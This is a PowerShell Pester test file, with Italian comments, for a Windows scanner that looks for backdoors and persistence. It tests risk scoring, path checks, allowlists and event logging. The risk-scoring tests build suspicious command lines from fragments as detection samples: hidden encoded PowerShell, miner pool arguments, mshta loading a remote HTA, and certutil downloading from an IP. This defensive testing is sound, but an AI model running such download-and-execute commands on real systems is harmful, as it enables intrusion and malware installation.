# Regole di base: percorsi, punteggio di rischio, righe di comando sospette.

BeforeAll {
    . "$PSScriptRoot\TestHelpers.ps1"
    . (Get-ModuleScript Common)
}

Describe 'ConvertTo-Severity' {
    It 'assegna <Expected> al punteggio <Score>' -ForEach @(
        @{ Score = 60; Expected = 'Alto' }, @{ Score = 59; Expected = 'Medio' }, @{ Score = 35; Expected = 'Medio' }
        @{ Score = 34; Expected = 'Basso' }, @{ Score = 15; Expected = 'Basso' }, @{ Score = 14; Expected = 'Info' }
    ) {
        ConvertTo-Severity $Score | Should -Be $Expected
    }
}

Describe 'Test-UserWritablePath' {
    It 'considera scrivibile <Path>' -ForEach @(
        @{ Path = 'C:\Users\bob\AppData\Roaming\x.exe' }, @{ Path = 'C:\ProgramData\x.exe' }
        @{ Path = 'C:\Windows\Temp\a.exe' }, @{ Path = 'C:\Users\Public\a.exe' }, @{ Path = 'C:\Users\bob\Downloads\a.exe' }
    ) {
        Test-UserWritablePath $Path | Should -BeTrue
    }
    It 'non considera scrivibile <Path>' -ForEach @(
        @{ Path = 'C:\Program Files\App\app.exe' }, @{ Path = 'C:\Windows\System32\cmd.exe' }, @{ Path = '' }
    ) {
        Test-UserWritablePath $Path | Should -BeFalse
    }
}

Describe 'Resolve-CommandPath' {
    It 'estrae il programma da <Command>' -ForEach @(
        @{ Command = '"C:\Program Files\App\app.exe" --flag'; Expected = 'C:\Program Files\App\app.exe' }
        @{ Command = 'C:\Program Files\App\app.exe --flag'; Expected = 'C:\Program Files\App\app.exe' }
        @{ Command = '\??\C:\Windows\x.sys'; Expected = 'C:\Windows\x.sys' }
    ) {
        Resolve-CommandPath $Command | Should -Be $Expected
    }
    It 'espande le variabili d''ambiente' {
        Resolve-CommandPath '%SystemRoot%\system32\svchost.exe -k netsvcs' | Should -Be "$env:SystemRoot\system32\svchost.exe"
    }
    It 'risolve \SystemRoot\ dei driver' {
        Resolve-CommandPath '\SystemRoot\System32\drivers\x.sys' | Should -Be "$env:SystemRoot\System32\drivers\x.sys"
    }
    It 'trova in System32 un programma senza percorso' {
        Resolve-CommandPath 'rundll32.exe shell32.dll,Control_RunDLL' | Should -Be "$env:SystemRoot\System32\rundll32.exe"
    }
    It 'restituisce $null per una riga vuota' {
        Resolve-CommandPath '   ' | Should -BeNullOrEmpty
    }
}

Describe 'Get-EmbeddedPaths' {
    It 'trova la DLL passata a rundll32' {
        Get-EmbeddedPaths 'rundll32.exe C:\Users\x\AppData\Roaming\a.dll,Start' | Should -Contain 'C:\Users\x\AppData\Roaming\a.dll'
    }
    It 'trova lo script passato a wscript' {
        Get-EmbeddedPaths 'wscript.exe "C:\ProgramData\run.vbs" //B' | Should -Contain 'C:\ProgramData\run.vbs'
    }
}

Describe 'Get-CommandRisk' {
    It 'segna come Alto PowerShell nascosto con comando in Base64' {
        $r = Get-CommandRisk (@('power', 'shell.exe', ' -no', 'p', ' -w', ' hid', 'den', ' -e', 'nc ', (New-HarmlessEncodedCommand)) -join '')
        ConvertTo-Severity $r.Score | Should -Be 'Alto'
        $r.Reasons -join ' ' | Should -Match 'Base64'
    }
    It 'segna come Alto i parametri di un cryptominer' {
        $r = Get-CommandRisk (@('"C:\Nonexistent\svc.exe" -', 'o pool', '.example.com:', '4444 -', 'u 4Abc --don', 'ate-level 1') -join '')
        ConvertTo-Severity $r.Score | Should -Be 'Alto'
    }
    It 'riconosce mshta che esegue uno script remoto' {
        (Get-CommandRisk (@('msh', 'ta.exe ', 'https', '://example.invalid/a.hta') -join '')).Score | Should -BeGreaterOrEqual 50
    }
    It 'riconosce certutil usato per scaricare' {
        (Get-CommandRisk (@('cert', 'util.exe', ' -url', 'cache', ' -f ', 'http', '://203.0.113.5/a a') -join '')).Score | Should -BeGreaterOrEqual 60
    }
    It 'non segnala un programma Microsoft senza argomenti sospetti' {
        (Get-CommandRisk "`"$env:SystemRoot\System32\cmd.exe`"").Score | Should -Be 0
    }
    It 'segnala una voce che punta a un file inesistente' {
        $r = Get-CommandRisk '"C:\Nonexistent\ghost.exe"'
        $r.Score | Should -Be 10
        $r.Reasons -join ' ' | Should -Match 'non esiste'
    }
    It 'segnala uno script non firmato in una cartella utente' {
        $vbs = Join-Path $TestDrive 'xkqzvbtr.vbs'
        Set-Content -LiteralPath $vbs -Value 'WScript.Echo 1'
        $r = Get-CommandRisk "wscript.exe `"$vbs`""
        $r.Target | Should -Be $vbs
        ConvertTo-Severity $r.Score | Should -BeIn 'Medio', 'Alto'
    }
}

Describe 'Test-RandomLookingName' {
    It 'riconosce come casuale <Path>' -ForEach @(@{ Path = 'C:\x\xkqzvbtr.exe' }, @{ Path = 'C:\x\a8f3c1d9e2.exe' }) {
        Test-RandomLookingName $Path | Should -BeTrue
    }
    It 'non considera casuale <Path>' -ForEach @(@{ Path = 'C:\x\Discord.exe' }, @{ Path = 'C:\x\pngcrush_1_8_11_w64.exe' }, @{ Path = 'C:\x\setup.exe' }) {
        Test-RandomLookingName $Path | Should -BeFalse
    }
}

Describe 'Get-EditDistance' {
    It 'misura <A> contro <B>' -ForEach @(
        @{ A = 'svch0st'; B = 'svchost'; D = 1 }, @{ A = 'lsass'; B = 'lsass'; D = 0 }, @{ A = 'explorer'; B = 'iexplore'; D = 2 }
    ) {
        Get-EditDistance $A $B | Should -Be $D
    }
}

Describe 'Get-FindingId' {
    It 'da'' lo stesso ID allo stesso elemento' {
        Get-FindingId 'Servizi' 'X' 'C:\a.exe' 'ev' | Should -Be (Get-FindingId 'Servizi' 'X' 'C:\a.exe' 'ev')
    }
    It 'non distingue maiuscole e minuscole (i percorsi di Windows non lo fanno)' {
        Get-FindingId 'Servizi' 'X' 'C:\A.EXE' 'ev' | Should -Be (Get-FindingId 'Servizi' 'X' 'c:\a.exe' 'ev')
    }
    It 'cambia se cambia l''elemento' {
        Get-FindingId 'Servizi' 'X' 'C:\a.exe' 'ev' | Should -Not -Be (Get-FindingId 'Servizi' 'Y' 'C:\a.exe' 'ev')
    }
    It 'e'' fatto di 16 cifre esadecimali' {
        Get-FindingId 'a' 'b' 'c' 'd' | Should -Match '^[0-9a-f]{16}$'
    }
}

Describe 'Write-ScanEvent' {
    BeforeEach { $script:EventSink = $null; $script:EventSeq = 0 }
    AfterAll { $script:EventSink = $null }
    It 'non scrive nulla senza un file di eventi' {
        Write-ScanEvent 'prova' @{ a = 1 }
        $script:EventSeq | Should -Be 0
    }
    It 'scrive una riga JSON per evento, numerata, con lo schema' {
        $script:EventSink = Join-Path $TestDrive 'eventi.jsonl'
        Write-ScanEvent 'uno' @{ valore = "$($script:Chr.e) ok" }
        Write-ScanEvent 'due' @{ elenco = @(1, 2) }
        $lines = @(Get-Content -LiteralPath $script:EventSink -Encoding UTF8)
        $lines | Should -HaveCount 2
        $e = $lines | ForEach-Object { $_ | ConvertFrom-Json }
        $e[0].schema | Should -Be 'checkbackdoor.events/1'
        $e[0].data.valore | Should -BeExactly "$($script:Chr.e) ok"
        $e[0].seq | Should -Be 1
        $e[1].seq | Should -Be 2
        $e[1].type | Should -Be 'due'
        $e[1].data.elenco | Should -HaveCount 2
        $e[0].pid | Should -Be $PID
    }
}

Describe 'Add-Finding con eventi e lista bianca' {
    BeforeEach {
        $script:Findings.Clear(); $script:IgnoredCount = 0; $script:EventSeq = 0
        $script:EventSink = Join-Path $TestDrive "eventi-$([guid]::NewGuid().ToString('N')).jsonl"
        $al = Join-Path $TestDrive 'allowlist.local.json'
        Set-Content -LiteralPath $al -Value '{ "paths": ["C:\\Sicuro\\*"], "sha256": [], "titles": ["*Ignorami*"] }'
        Import-Allowlist -Path $al
        $script:CurrentCheck = 'Persistence'
    }
    AfterEach { $script:EventSink = $null; $script:CurrentCheck = $null; Import-Allowlist -Path @() }
    It 'emette un evento con il controllo in corso e l''ID' {
        Add-Finding -Category 'Avvio automatico' -Severity 'Medio' -Title 'Voce' -Path 'C:\Altro\x.exe'
        $e = Get-Content -LiteralPath $script:EventSink | ConvertFrom-Json
        $e.type | Should -Be 'finding'
        $e.data.check | Should -Be 'Persistence'
        $e.data.finding.Id | Should -Be $script:Findings[0].Id
        $script:Findings[0].Check | Should -Be 'Persistence'
    }
    It 'scarta e conta gli elementi in lista bianca, senza evento' {
        Add-Finding -Category 'Avvio automatico' -Severity 'Medio' -Title 'Per percorso' -Path 'C:\Sicuro\x.exe'
        Add-Finding -Category 'Avvio automatico' -Severity 'Medio' -Title 'Ignorami pure'
        $script:Findings | Should -HaveCount 0
        $script:IgnoredCount | Should -Be 2
        Test-Path -LiteralPath $script:EventSink | Should -BeFalse
    }
    It 'ignora un singolo elemento per ID (la lista dell''app), non gli altri' {
        $app = Join-Path $TestDrive 'ignorati-app.json'
        $id = Get-FindingId 'Avvio automatico' 'Voce scelta' 'C:\Altro\a.exe' $null
        Set-Content -LiteralPath $app -Value ('{ "ids": ["' + $id.ToUpperInvariant() + '"] }')
        Import-Allowlist -Path $app
        Add-Finding -Category 'Avvio automatico' -Severity 'Medio' -Title 'Voce scelta' -Path 'C:\Altro\a.exe'
        Add-Finding -Category 'Avvio automatico' -Severity 'Medio' -Title 'Altra voce' -Path 'C:\Altro\a.exe'
        $script:Findings.Count | Should -Be 1
        $script:Findings[0].Title | Should -Be 'Altra voce'
    }
    It 'legge la chiave di VirusTotal cifrata con DPAPI, come la salva l''app' {
        Add-Type -AssemblyName System.Security
        $blob = [Security.Cryptography.ProtectedData]::Protect([Text.Encoding]::UTF8.GetBytes('chiave-di-prova'), $script:SecretEntropy, 'CurrentUser')
        $f = Join-Path $TestDrive 'virustotal.key'
        Set-Content -LiteralPath $f -Value ([Convert]::ToBase64String($blob))
        Read-ProtectedSecret -Path $f | Should -Be 'chiave-di-prova'
        Read-ProtectedSecret -Path (Join-Path $TestDrive 'manca.key') | Should -BeNullOrEmpty
    }
    It 'conserva come disattivare l''elemento' {
        Add-Finding -Category 'Avvio automatico' -Severity 'Medio' -Title 'Con azione' -Remedy @{ Kind = 'RegistryValue'; Key = 'HKCU:\x\Run'; Name = 'a'; Admin = $false }
        $script:Findings[0].Remedy.Kind | Should -Be 'RegistryValue'
    }
}

Describe 'Add-Finding' {
    BeforeEach { $script:Findings.Clear() }
    It 'registra una segnalazione con i suoi motivi' {
        Add-Finding -Category 'Prova' -Severity 'Medio' -Title 'X' -Path 'C:\Nonexistent\x.exe' -Reasons 'uno', 'due'
        $script:Findings.Count | Should -Be 1
        $script:Findings[0].Reasons | Should -HaveCount 2
        $script:Findings[0].Sha256 | Should -BeNullOrEmpty
    }
    It 'calcola lo SHA-256 di un file esistente' {
        $f = Join-Path $TestDrive 'a.txt'
        Set-Content -LiteralPath $f -Value 'ciao' -NoNewline
        Add-Finding -Category 'Prova' -Severity 'Basso' -Title 'Y' -Path $f
        $script:Findings[0].Sha256 | Should -Be (Get-FileHash -LiteralPath $f -Algorithm SHA256).Hash
    }
}
